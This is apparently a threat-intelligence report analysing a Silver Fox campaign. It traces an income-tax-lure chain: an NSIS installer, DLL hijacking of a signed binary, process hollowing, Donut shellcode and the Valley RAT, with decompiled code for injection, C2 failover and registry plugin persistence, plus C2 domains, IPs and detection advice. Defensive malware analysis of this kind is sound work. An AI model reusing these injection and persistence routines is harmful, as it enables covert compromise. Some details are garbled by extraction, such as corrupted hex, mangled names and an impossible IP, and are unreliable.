\n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 